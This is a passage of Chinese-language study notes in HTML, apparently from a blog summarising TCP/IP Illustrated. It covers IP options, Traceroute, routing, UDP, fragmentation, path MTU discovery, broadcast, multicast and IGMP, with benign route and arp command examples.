<li>源端主机生成RR选项，中间路由器对RR选项的处理，以及把ICMP回显请求中的RR清单复制到ICMP回显应答中，所有这些都是选项功能。幸运的是，现在的大多数系统都支持这些选项功能，只能有一些系统不把ICMP请求的IP清单赋值到ICMP应答中。</li>
<li>但是，最大的问题是IP首部中只有有限的空间来存放IP地址。IP首部中的首部长度字段只有4bit，因此整个IP首部最长只能包括15个32bit长的字（即60个字节）。由于IP首部固定长度为20字节，RRR选项用去3个字节，这样只剩下37个字节（60-20-3）来存放IP地址清单，也就是说只能存放9个IP地址</li>
</ul>
<h2 id="IP时间戳选项"><a href="#IP时间戳选项" class="headerlink" title="IP时间戳选项"></a>IP时间戳选项</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow3.jpg" alt=""></p>
<ul>
<li>时间戳选项的代码为0x44。其他两个字段len和ptr与记录路由选项相同：选项的总长度（一般为36或40）和指向下一个可用时间的指针（5，9，13等）</li>
<li>接下来的两个字段是4bit的值：OF表示溢出字段，FL表示标志字段。时间戳选项的操作</li>
<li>时间戳的取值一般为自UTC午夜开始计的毫秒数，与ICMP时间戳请求和应答相类似。如果路由器不使用这种格式，它就可以插入任何它使用的时间表示格式，但是必须打开时间戳中的高位以表明为非标准值</li>
<li>与我们遇到的记录路由选项所受到的限制相比，时间戳选项遇到情况要更坏一些。如果我们要同时记录IP地址和时间戳（标志位为1），那么就可以同时存入其中的四对值。只记录时间戳是没有用处的，因为没有标明时间戳与路由器之间的对应关系</li>
</ul>
<h1 id="Traceroute程序"><a href="#Traceroute程序" class="headerlink" title="Traceroute程序"></a>Traceroute程序</h1><ul>
<li>由Van Jacobson编写的Traceroute程序是一个能更深入探索TCP|IP协议的方便可用的工具</li>
<li>Traceroute程序可以让我们看到IP数据报从一台主机传到另一台主机所经过的路由</li>
<li>Traceroute程序还可以让我们使用IP源路由选项</li>
</ul>
<h2 id="Traceroute和IP路径记录选项的比较"><a href="#Traceroute和IP路径记录选项的比较" class="headerlink" title="Traceroute和IP路径记录选项的比较"></a>Traceroute和IP路径记录选项的比较</h2><p>我们描述了IP记录路由选项（RR）。为什么不使用这个选项而另外开发一个新的应用程序？有三个方面的原因。</p>
<ul>
<li>首先，原先并不是所有的路由器都支持记录路由选项，因此该选项在某些路径上不能使用（Traceroute程序不需要中间路由器具备任何特殊的或可选的功能）</li>
<li>其次，记录路由一般是单向的选项。发送端设置了该选项，那么接收端不得不从收到的IP首部中提取所有的信息，然后全部返回给发送端.大多数Ping服务器的实现（内核中的ICMP回显应答功能）把接收到的RR清单返回，但是这样使得记录下来的IP地址翻了一番（一来一回）。</li>
<li>最后一个原因也是最主要的原因是，IP首部中留给选项的空间有限，不能存放当前大多数的路径</li>
</ul>
<h2 id="Traceroute程序的操作"><a href="#Traceroute程序的操作" class="headerlink" title="Traceroute程序的操作"></a>Traceroute程序的操作</h2><ul>
<li>Traceroute程序使用ICMP报文和IP首部中的TTL字段（生存周期）。TTL字段是由发送端初始设置一个8bit字段。推荐的初始值由分配数字RFC指定，当前值为64.较老版本的系统经常初始化为15或32.发送ICMP回显应答时经常把TTL设为最大值255</li>
<li>每个处理数据报的路由器都需要把TTL的值减1或减去数据报在路由器中停留的秒数。由于大多数的路由器转发数据报的时延都小于1秒钟，因此TTL最终成为一个跳站的计数器，所经过的每个路由器都将其值减1</li>
<li>当路由器收到一份IP数据报，如果其TTL字段是0或1，则路由器不转发该数据报（接收到这种数据报的目的主机可以将它交给应用程序，这是因为不需要转发该数据报。但是在通常情况下，系统不应该接收TTL字段为0的数据报）。相反，路由器将该数据报丢弃，并给信源机发一份ICMP“超时”信息。Traceroute程序的关键在于包含这份ICMP信息的IP报文的信源地址是该路由器的IP地址</li>
<li>Traceroute程序发送一份UDP数据报给目的主机，但它选择一个不可能的值作为UDP端口号（大于3000），使目的主机的UDP模块产生一份“端口不可达”错误的ICMP报文。这样，Traceroute程序所要做的就是区分接收到的ICMP报文是超时还是端口不可达，以判断什么时候结束。</li>
</ul>
<h2 id="IP源选路选项"><a href="#IP源选路选项" class="headerlink" title="IP源选路选项"></a>IP源选路选项</h2><p>源站选项（source routing）的思想是由发送者指定路由，它可以采用以下两种形式：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow.jpg" alt=""></p>
<ul>
<li>严格的源路由选择。发送端指明IP数据报所必须采用的确切路由。如果一个路由器发现源路由所指定的下一个路由器不在其直接连接的网络上，那么它就返回一个“源路路由失败”的ICMP差错报文</li>
<li>宽松的源站选路，发送端指明了一个数据报经过的IP地址清单，但是数据报在清单上指明的任意两个地址之间可以通过其他路由器</li>
<li>这个格式与记录路由选项格式基本一致。不同之处是，对于源站选路，我们必须在发送IP数据报前填充IP地址清单；而对于记录路由选项，我们需要为IP地址清单分配并清空一些空间，并让路由器填充该清单中各项。同时，对于源站选路，只要为所需要的IP地址数分配空间并进行初始化，通常其数量小于9.而对于记录路由选项来说，必须尽可能地分配空间，以达到9个地址</li>
<li>对于宽松的源站来说，code字段的值是0x83；而对于严格的源站选路，其值为0x89.len和ptr字段与IP首部中的记录路由选项的一般格式是一样的</li>
</ul>
<h2 id="IP源站选路的操作机制"><a href="#IP源站选路的操作机制" class="headerlink" title="IP源站选路的操作机制"></a>IP源站选路的操作机制</h2><p>源站路由选项的实际称呼为“源站及记录路由”（对于宽松的源站选路和严格的源路选路，分别用LSRR和SSRR表示），这是因为在数据报沿路由发送过程中，对IP地址清单进行了更新。下面是其运行过程：</p>
<ul>
<li>发送主机从应用程序接收源站路由清单，将第1个表项去掉（它是数据报的最终目的地址），将剩余的项移到1个项中，并将原来的目的地址作为清单的最后一项。指针仍然指向清单的第1项（即，指针的值为4）</li>
<li>每个处理数据报的路由器检查其是否为数据报的最终地址。如果不是，则正常转发数据报（在这种情况下，必须指明宽松源站选路，否则就不能接收到该数据报）</li>
<li>如果该路由器是最终目的，且指针不大于路径的长度，那么（1）由ptr所指定的清单中的下一个地址就是数据报的最终目的地址；（2）由外接口响应的IP地址取代刚才使用的源地址；（4）指针加4</li>
<li>Host Requirements RFC指明，TCP客户必须能指明源站选路，同时，TCP服务器必须能够接收源站选路，并且对于该TCP连接的所有报文段都能采用反向路由。如果TCP服务器下面接收到一个不同的源站选路，那么新的源路路由将取代旧的源路路由</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow1.jpg" alt=""></p>
<h1 id="IP选路"><a href="#IP选路" class="headerlink" title="IP选路"></a>IP选路</h1><ul>
<li>选路是IP最重要的功能之一</li>
<li>路由守护程序（daemon），通常这是一个用户进程</li>
<li>在Unix系统中，大多数普通的守护程序都是路由程序和网关程序</li>
<li>路由表经常被IP访问，但是它被路由守护程序更新的频度却要低得多</li>
<li>当接收到ICMP重定向报文时，路由表也要被更新</li>
<li><p>用netstat命令来显示路由表</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170421202212.jpg" alt=""></p>
</li>
</ul>
<h2 id="选路的原理"><a href="#选路的原理" class="headerlink" title="选路的原理"></a>选路的原理</h2><p>IP搜索路由表的几个步骤：</p>
<ul>
<li>搜索匹配的主机地址</li>
<li>搜索匹配的网络地址</li>
<li>搜索默认表项（默认表项一般在路由表中被指定为一个网络表项，其网络号为0）</li>
<li>CISCO的选路策略（1.明细策略路由 2.明细路由 3.策略默认路由 4.默认路由）</li>
<li>IP执行选路机制，而路由守护程序则一般提供选路策略</li>
</ul>
<h2 id="初始化路由表"><a href="#初始化路由表" class="headerlink" title="初始化路由表"></a>初始化路由表</h2><ul>
<li>每当初始化一个接口时（通常是用ifconfig命令设置接口地址），就为接口自动创建一个直接路由。对于点对点链路和环回接口来说，路由是到达主机（例如，设置H标志）。对于广播接口来说，如以太网，路由是到达网络</li>
<li>到达主机或网络的路由如果不是直接相连的，那么就必须加入路由表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">route add default sun 1</div><div class="line">route add slip bsdi 1</div><div class="line">route add 1.1.1.0 mask 255.255.255.0 1.1.1.1</div></pre></td></tr></table></figure>
<ul>
<li>第三个参数（defalut和slip）代表目的端，第四个参数代表网关（路由器），最后一个参数代表路由的度量（metric）.route命令在度量值大于0时要为该路由设置G标志，否则，当耗费值为0时就不设置G标志</li>
</ul>
<h2 id="转发或不转发"><a href="#转发或不转发" class="headerlink" title="转发或不转发"></a>转发或不转发</h2><ul>
<li>一般都假定主机不转发IP数据报，除非对它们进行特殊配置而作为路由器使用</li>
<li>大多数伯克利派出来的系统都有一个内核变量ipforwarding</li>
<li>SumOS 4.1.x允许该变量可以有三个不同的值：-1表示始终不转发并且始终不改变它的值；0表示默认条件下不转发，但是当打开两个或更多个接口时就把值设为1；1表示始终转发。Solaris 2.x把这个值改为0（始终不转发）’1（始终转发）和2（在打开两个或更多个接口是才转发）</li>
<li>较早版本的4.2BSD主机在默认条件下可以转发数据报，这给没有进行正确配置的系统带来了许多问题。这就是内核选项为什么要设成默认的“始终不转发”的原因，除非系统管理员进行特殊设置</li>
</ul>
<h2 id="ICMP重定向差错"><a href="#ICMP重定向差错" class="headerlink" title="ICMP重定向差错"></a>ICMP重定向差错</h2><ul>
<li>我们假定主机发送一份IP数据报给R1.这种选路决策经常发生，因为R1是该主机的默认路由</li>
<li>R1收到数据报并检查它的路由表，发现R2是发送数据报的下一站。当它把数据报发送给R2时，R1检测到它正在发送的接口与数据报达到接口是相同的（即主机和两个路由器所在的LAN）。这样就给路由器发送重定向报文给原始发送端提供了线索</li>
<li>R1发送一份ICMP重定向报文给主机，告诉它以后把数据报发送给R2而不是R1</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170422232852.jpg" alt=""></p>
<h1 id="UDP：用户数据报协议"><a href="#UDP：用户数据报协议" class="headerlink" title="UDP：用户数据报协议"></a>UDP：用户数据报协议</h1><h2 id="UDP介绍"><a href="#UDP介绍" class="headerlink" title="UDP介绍"></a>UDP介绍</h2><ul>
<li>UDP是一个简单的面向数据报的运输层协议：进程的每个输出操作都正好产生一个UDP数据报，并组装成一份待发送的IP数据包</li>
<li>这与面向流字符的协议不同，如TCP，应用程序产生的全体数据与真正发送的单个IP数据报可能没什么联系</li>
<li>UDP不提供可靠性：它把应用程序传给IP层的数据发送出去，但是并不保证它们能到达目的地</li>
<li>应用程序必须关心IP数据报的长度。如果它超过网络的MTU，那么就要对IP数据报进行分片</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211857142503378.png" alt=""></p>
<h2 id="UDP三大典型运用"><a href="#UDP三大典型运用" class="headerlink" title="UDP三大典型运用"></a>UDP三大典型运用</h2><h3 id="查询类：DNS"><a href="#查询类：DNS" class="headerlink" title="查询类：DNS"></a>查询类：DNS</h3><ul>
<li>没有TCP三次握手包过程，快</li>
<li>多个DNS同时查询</li>
</ul>
<h3 id="数据传输：TFTP"><a href="#数据传输：TFTP" class="headerlink" title="数据传输：TFTP"></a>数据传输：TFTP</h3><ul>
<li>停止等待协议，慢（需运用层确定数据）</li>
<li>适合无盘工作站</li>
</ul>
<h3 id="语言视频流"><a href="#语言视频流" class="headerlink" title="语言视频流"></a>语言视频流</h3><ul>
<li>支持广播和组播</li>
<li>支持丢包，保障效率</li>
</ul>
<h2 id="UDP首部"><a href="#UDP首部" class="headerlink" title="UDP首部"></a>UDP首部</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/211907360933802.png" alt=""></p>
<ul>
<li>端口号表示发送进程和接收进程</li>
<li>TCP端口号与UDP端口号是相互独立的。（rsh和syslog=514）</li>
<li>尽管相互独立，如果TCP和UDP同时提供某种知名服务，两个协议通常选择相同的端口号。这纯粹是为了使用方便，而不是协议本事的要求（dns）</li>
<li>UDP长度字段指的是UDP首部和UDP数据的字节长度。该字段的最小值为8字节</li>
</ul>
<h2 id="UDP检验和"><a href="#UDP检验和" class="headerlink" title="UDP检验和"></a>UDP检验和</h2><ul>
<li>UDP检验和覆盖UDP首部和UDP数据</li>
<li>IP首部的检验和，它只覆盖IP的首部</li>
<li>UDP的检验和是可选的，而TCP的检验和是必需的</li>
<li>IP计算检验和和UDP计算检验和之间存在不同的地方。首先，UDP数据报的长度可以为奇数字节，但检验和算法是把若干个16bit字相加。解决方法是必要时在最后增加填充字节0，这只是为了检验和的计算（也就是说，可能增加的填充字节不被传送）</li>
<li>UDP数据报和TCP段都包含一个12字节长的伪首部，它是为了计算检验和而设置的。伪首部包含IP首部一些字段。其目的是让UDP两次检查数据是否已经正确到达目的地（例如，IP没有接受地址不是本主机的数据报，以及IP没有把应传给另一高层的数据报传给UDP）</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211955147184376.png" alt=""></p>
<h2 id="tcpdump输出"><a href="#tcpdump输出" class="headerlink" title="tcpdump输出"></a>tcpdump输出</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE2017042317114.jpg" alt=""></p>
<ul>
<li>三个系统有两个打开了UDP检验和选项</li>
<li>送出的数据报与收到的数据报具有相同的检验和值（第3和第4行，第5和第6行）。从图11-3可以看出，两个IP地址进行了交换，正如两个端口号一样。伪首部和UDP首部中的其他字段都是相同的，就想数据回显一样。这再次表明UDP检验和（事实上，TCP|IP协议簇中所有的检验和）是简单的16bit和。它们检测不出交换两个16bit的差错</li>
</ul>
<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170423172522.jpg" alt=""></p>
<ul>
<li>在发送第一份数据报之前，发送端和接收端之间没有任何通信</li>
<li>当收到数据时，接收端没有任何确认。在这个例子中，发送端并不知道零一端是否已经收到这些数据报</li>
<li>每次运行程序时，源端的UDP端口号都发生变化。第一次是1108，然后是1110.客户程序使用ephemeral端口号一般在1024~5000之间</li>
</ul>
<h2 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h2><ul>
<li>IP把MTU与数据报长度进行比较</li>
<li>如果需要则进行分片。分片可以发生在原始发送端主机上，也可以发送在中间路由器上。</li>
<li>把一份IP数据报分片以后，只有到达目的地才进行重新组装（FR fragment）</li>
<li>重新组装由目的端的IP层来完成，其目的是使分片和重新组装过程对运输层（TCP和UDP）是透明的</li>
<li>已经分片过的数据报有可能会再次进行分片（可能不止一次）</li>
<li>当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部中有足够的信息让接收端能正确组装这些数据报片</li>
<li>尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报</li>
<li>IP层本身没有超时重传的机制–由更高层来负责超时和重传（TCP有超市和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自TCP报文段的某一片丢失后，TCP在超时后会重发整个TCP报文段，该报文段对应于一份IP数据报。没有办法只能重传数据报中的一个数据报片</li>
<li>如果对数据报分片的是中间路由器，而不是启事端系统，那么起始端系统就无法知道数据报是如何被分片的。就这个原因，要经常避免分片</li>
</ul>
<h3 id="IP分片：注意事项"><a href="#IP分片：注意事项" class="headerlink" title="IP分片：注意事项"></a>IP分片：注意事项</h3><ul>
<li>在分片时，除最后一片外，其他每一片中的数据部分（除IP首部外的其余部分）必须是8字节的整数倍</li>
<li>IP首部被复制到各个片中。但是，端口号在UDP首部，只能在第一片中被发现</li>
<li>需要解释几个术语：IP数据报是指IP层端到端的传输单元（在分片之前和重新组装之后），分组是指在IP层和链路层之间的数据单元，一个分组可以是一个完整的IP数据报，也可以是IP数据报的一个分片</li>
</ul>
<h2 id="ICMP不可达差错（需要分片）"><a href="#ICMP不可达差错（需要分片）" class="headerlink" title="ICMP不可达差错（需要分片）"></a>ICMP不可达差错（需要分片）</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/212127065468647.png" alt=""></p>
<ul>
<li>发生ICMP不可达差错的另一种情况是，当路由器收到一份需要分片的数据报，而在IP首部又设置了不分片(DF的标志比特。如果某个程序需要判断到目的端的路途中最小MTU是多少–称作路径MTU发现机制，那么这个差错就可以被该程序使用</li>
<li>如果路由器没有提供这种新的ICMP差错报文格式，那么下一站的MTU就设为0</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424210136.jpg" alt=""></p>
<ul>
<li>在点到点的链路中，不要求两个方向的MTU为相同值</li>
<li>在主机sun上运行tcpdump，观察SLIP链路，看什么时候发生分片。开始没有观察到分片，一切都很正常知道ping分组的数据长度从500增加到600字节。可以看到接收到的回显请求（仍然没有分片），但不见回显应答</li>
<li>Ping的时候DF置位（echo设置DF位，echo-reply也会设置DF位）</li>
</ul>
<h2 id="用Traceroute确定路径MTU"><a href="#用Traceroute确定路径MTU" class="headerlink" title="用Traceroute确定路径MTU"></a>用Traceroute确定路径MTU</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205607.jpg" alt=""></p>
<ul>
<li>MTU值的个数是有限的，因此在我们的程序中有些由近似值构成的表，取下一个最小的MTU值来发送</li>
<li>上面的测试中间设备不回送吓一跳的MTU，下面的测试回送了下一跳的MTU</li>
</ul>
<h2 id="采用UDP的路径MTU发现"><a href="#采用UDP的路径MTU发现" class="headerlink" title="采用UDP的路径MTU发现"></a>采用UDP的路径MTU发现</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205406.jpg" alt=""></p>
<ul>
<li>Solaris发送650字节的udp包，并且DF被置位</li>
<li>被bsdi丢弃，但是不回送MTU值</li>
<li>Solaris自以为是的对数据包进行分片（552 106两个片）</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205651.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205746.jpg" alt=""></p>
<ul>
<li>Solaris自以为是的对数据报进行分片（552 106两个片）造成不优化的再次分片</li>
<li>最好的解决方式是让bsdi回送MTU，Solaris根据这个MTU采取最优化的分片</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205832.jpg" alt=""></p>
<h2 id="UDP和ARP之间的交互作用"><a href="#UDP和ARP之间的交互作用" class="headerlink" title="UDP和ARP之间的交互作用"></a>UDP和ARP之间的交互作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bsdi % arp -a验证ARP高速缓存是空的</div><div class="line">bsdi % sock -u -i -l -w8192 svr4 discard</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205918.jpg" alt=""></p>
<ul>
<li>1.在第一个ARP应答返回以前，总共产生了6个ARP请求</li>
<li>2.在接收第一个ARP应答时（第7行），只发送最后一个数据报片（第9行）</li>
<li>3.在大多数的实现中，在等待一个ARP应答时，只将最后一个报文发送给特定目的主机</li>
<li>4.另一个无法解释的不正常的现象是，svr4发回7个，而不是6个ARP应答</li>
<li>5.这里我们没有看到ICMP消息的原因有两个。首先，大多数从Berkeley派生的实现从不产生该差错！这些实现会设置定时器，也会在定时器溢出时将数据报片丢弃，但是不生成ICMP差错</li>
<li>6.第二，并未接收到包含UDP首部的偏移量为0的第一个数据报片（这是被ARP所丢弃的5个报文的第一个）除非接收到第一个数据报片，否则并不要求任何实现产生ICMP差错</li>
</ul>
<h2 id="最大UDP数据报长度"><a href="#最大UDP数据报长度" class="headerlink" title="最大UDP数据报长度"></a>最大UDP数据报长度</h2><ul>
<li>IP数据报的最大长度是65535字节，这是由IP首部16比特总长度字段所限制的</li>
<li>我们将遇到两个限制因素，第一，应用程序可能会收到其程序接口的限制。Socket API提供了一个可供应用程序调用的函数，以设置接收和发送缓存的长度。对于UDP socket，这个长度与应用程序可以读写的最大UDP数据报的长度直接相关。现在的大部分系统都默认提供了可读写大于8192字节的UDP数据报（使用这个默认值是因为8192是NFS读写用户数据数的默认值）</li>
<li>第二个限制来自于TCP|IP的内核实现。可能存在一些实现特性（或差错），使IP数据报长度小于65535字节</li>
<li>在SunOS4.1.3下使用环回接口的最大IP数据报长度是32767字节。比它大的值都会发生差错。但是从BSD/386到SunOS4.1.3的情况下，Sun所能接收到最大IP数据报长度为32786字节（即32758字节用户数据）。在Solaris2.2下使用环回接口，最大可收发IP数据报长度为65535字节。从Solaris2.2到AIX3.2.2,发送的最大IP数据报长度可以是65535字节。很显然，这个限制和源端和目的端的实现有关</li>
<li>要求主机必须能够接收最短为576字节的IP数据报，在许多的UDP应用程序的设计中，其应用数据被限制成512字节或更小，因此比这个限制值小</li>
</ul>
<h2 id="ICMP源站抑制差错"><a href="#ICMP源站抑制差错" class="headerlink" title="ICMP源站抑制差错"></a>ICMP源站抑制差错</h2><p>当一个系统（路由器或主机）接收数据报的速度比其处理速度快时，可能产生这个差错。</p>
<p>注意：“可能”产生这个差错。即使一个系统已经没有缓存并丢弃数据报，也不要求它一定要发送源站抑制报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/212155080782897.png" alt=""></p>
<h2 id="UDP服务器的设计"><a href="#UDP服务器的设计" class="headerlink" title="UDP服务器的设计"></a>UDP服务器的设计</h2><p>对于服务器来说，它启动后处于休眠状态，等待客户请求的到来。对于UDP来说，当客户数据报到达时，服务器苏醒过来，数据报中可能包含来自客户的某种形式的请求消息。</p>
<ul>
<li><p>（1）客户IP地址及端口号<br>IP首部包含源端和目的端IP地址，UDP首部包含了源端和目的端的UDP端口号。当一个应用程序接收到UDP数据报时，操作系统必须告诉它是谁发送了这份消息，即源IP地址和端口号。这个特性允许一个交互UDP服务器对多个客户进行处理。给每个发送请求的客户发回应答。</p>
</li>
<li><p>（2）目的IP地址<br>一些应用程序需要知道数据报是发送给谁的，即目的IP地址。这要求操作系统从接收到的UDP数据报中将目的IP地址交给应用程序。</p>
</li>
<li><p>（3）UDP输入队列<br>大多数UDP服务器是交互服务器。这意味着，单个服务器进程对单个UDP端口上（服务器上的名知端口）的所有客户请求进行处理。</p>
</li>
</ul>
<p>通常程序所使用的每个UDP端口都与一个有限大小的输入队列相联系。来自不同客户的差不多同时到达的请求将由UDP自动排队。接收到的UDP数据报以其接收顺序交给应用程序</p>
<p>排队溢出造成内核中的UDP模块丢弃数据报的可能性是存在的。</p>
<p>1）应用程序并不知道其输入队列何时溢出。只是由UDP对超出数据报进行丢弃处理。</p>
<p>2）没有发回任何信息告诉客户其数据报被丢弃。</p>
<ul>
<li>（4）限制本地IP地址<br>大多数UDP服务器在创建UDP端点时都使其本地IP地址具有通配符(wildcard)的特点。表明进入的UDP数据报如果其目的地为服务器端口，那么在任何本地接口均可接收到它。</li>
</ul>
<p>另一方面，当服务器创建端点时，它可以把其中一个主机本地IP地址包括广播地址指定为端点的本地IP地址。只有当目的IP地址与指定的地址相匹配时，进入的UDP数据报才能被送到这个端点。</p>
<ul>
<li>（5）限制远端IP地址</li>
</ul>
<p>大多数系统都允许UDP端点对远端地址进行限制，即端点将只能接收特定IP地址和端口号的UDP数据报。</p>
<ul>
<li>（6）每个端口有多个接收者</li>
</ul>
<p>大多数系统在某一时刻只允许一个程序端点与某个本地IP地址及UDP端口号相关联。当目的地为该IP地址及端口号的UDP数据报到达主机时，就复制一份传给该端点。</p>
<p>然而，在一个支持多播的系统上，多个端点可以使用同一个IP地址和UDP端口号。</p>
<p>当UDP数据报到达的目的IP地址为广播地址或多播地址，而且在目的IP地址和端口号处有多个端点时，就向每个端点传送一份数据报的复制。如果UDP数据报到达的是一个单播地址，那么只向其中一个端点传送一份数据报的复制。选择哪个端点传送数据取决于各个不同的系统实现。</p>
<h1 id="广播与多播"><a href="#广播与多播" class="headerlink" title="广播与多播"></a>广播与多播</h1><ul>
<li>三种IP地址：单播地址、广播地址和多播地址。</li>
<li>广播和多播仅应用于UDP，它们对需要将报文同时传往多个接收者的应用来说十分重要</li>
<li>TCP是一个面向连接的协议，它意味着分别运行于两主机（由IP地址确定）内的两进程（由端口号确定）间存在一条连接</li>
<li>有时一个主机要向网上的所有其他主机发送帧，这就是广播。通过ARP和RARP可以看到这一过程</li>
<li>多播处于单播和广播之间：帧仅传送给属于多播组的多个主机</li>
</ul>
<h2 id="协议栈各层对收到帧的过滤过程"><a href="#协议栈各层对收到帧的过滤过程" class="headerlink" title="协议栈各层对收到帧的过滤过程"></a>协议栈各层对收到帧的过滤过程</h2><ul>
<li>网卡查看帧，确定是否接收该帧，若接收后将它传递给设备驱动程序。网卡仅接收目的地址为网卡物理地址或广播地址的帧。如果多接口设置为混合模式，能接收每个帧的一个复制；</li>
<li>设备驱动程序将进行另外的帧过滤：<br>1）帧类型中必须指定要使用的协议；<br>2）进行多播过滤来检测该主机是否属于多播地址说的多播组</li>
<li>设备驱动程序将数据帧传递给IP层（如果为IP类型的数据报）。IP根据IP地址中源地址和目的地址进行更多的过滤检测。如果正常，将数据报传递给下一层；</li>
<li>UDP根据IP层传递数据中目的端口来进行过滤。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170425212507.jpg" alt=""></li>
</ul>
<h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><ul>
<li>受限的广播255.255.255.255</li>
<li>指向网络的广播10.255.255.255 192.168.1.255</li>
<li>指向子网的广播10.11.255.10.1.255.255</li>
<li>指向所有子网的广播10.255.255.255</li>
<li>主机处理的地址192.168.255.255（cisco路由器支持）</li>
<li>路由器支持255.255.255.255，主机不支持（当主机处理）</li>
</ul>
<h2 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h2><p>IP多播提供两类服务：</p>
<ul>
<li>向多个目的地址发送数据；</li>
<li>客户对服务器的请求。</li>
</ul>
<h3 id="多播组地址"><a href="#多播组地址" class="headerlink" title="多播组地址"></a>多播组地址</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170425215329.jpg" alt=""></p>
<ul>
<li>多播组地址包括为1110的最高4bit和多播组号。它们通常可表示为点分十进制数，范围从224.0.0.0到239.255.255.255</li>
<li>能够接收发往一个特定多播组地址数据的主机集合称为主机组（host group）。一个主机组可以跨越多个网络。主机组中成员可随机加入或离开主机组，主机组中对主机的数量没有限制，同时不属于某一个主机组的主机可以向该组发送信息</li>
<li>一些多播组地址被IANA确定为知名地址。它们也被当做用久主机组，这和TCP及UDP中的熟知端口相似</li>
</ul>
<h3 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h3><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160406160845156-123233528.png" alt=""></p>
<ul>
<li>IANA拥有一个以太网地址块，即高位24bit为00:00:5e（十六进制表示），这意味着该地址块所拥有的地址范围从00:00:5e:00:00:00到00:00:5e:ff:ff:ff。IANA将其中的一半（高位的第四个字节的高四位分成0~7和8~f两半，这样是分成了整体的一半）分配为多播地址。为了指明一个多播地址，任何一个以太网地址的首字节必须是01，这意味着与IP多播相对应的以太网地址范围从01:00:5e:00:00:00到01:00:5e:7f:ff:ff（7f这个就是一半）。</li>
<li>由于7的二进制是0111，所以高位0是确定的了，因此以太网地址的前三个字节01:00:5e和下一位0确定了25bit。剩下的23bit和IP地址的低23bit相同。这样D类地址中高9bit中的低5bit就被忽略了。 –这样带来一个问题，5bit被忽略，那么表示会有32（2的5次方）个不同的多播号映射成了相同的以太网地址…比如：224.128.64.32和224.0.64.32都映射为同一以太网地址01:00:5e:00:40:20。</li>
<li>既然地址映射是不唯一的，那么设备驱动程序或IP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能，设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</li>
</ul>
<h1 id="IGMP：Internet组管理协议"><a href="#IGMP：Internet组管理协议" class="headerlink" title="IGMP：Internet组管理协议"></a>IGMP：Internet组管理协议</h1><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122404140-1999656219.png" alt=""></p>
<ul>
<li>IGMP协议让一个物理网络上的所有系统知道主机当前所在的多播组。多播路由器需要这些信息以便知道多播数据报应该向哪些接口转发。 </li>
<li>正如ICMP一样，IGMP也被当作IP层的一部分。IGMP报文通过IP数据报进行传输。不像我们已经见到的其他协议，IGMP有固定的报文长度，没有可选数据</li>
</ul>
<h2 id="IGMP报文"><a href="#IGMP报文" class="headerlink" title="IGMP报文"></a>IGMP报文</h2><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122411187-535768858.png" alt=""></p>
<ul>
<li>这是版本为1的IGMP。IGMP类型为1说明是由多播路由器发出的查询报文，为2说明是主机发出的报告报文（多播路由器发出的是查询类型的报文，网络上的主机发送的是报告类型的报文）。检验和的计算和IGMP协议相同，同样覆盖首部和数据部分。</li>
<li>组地址为D类IP地址。在查询报文中组地址设置为0，在报告报文中组地址为要参加的组地址。</li>
</ul>
<h2 id="IGMP报告和查询"><a href="#IGMP报告和查询" class="headerlink" title="IGMP报告和查询"></a>IGMP报告和查询</h2><p>多播路由器使用IGMP报文来记录与该路由器相连网络中组成员的变化情况。使用规则如下：</p>
<ul>
<li>当第一个进程加入一个组时，主机就发送一个IGMP报告。如果一个主机的多个进程加入同一组，只发送一个IGMP报告。这个报告被发送到进程加入组所在的同一接口上。</li>
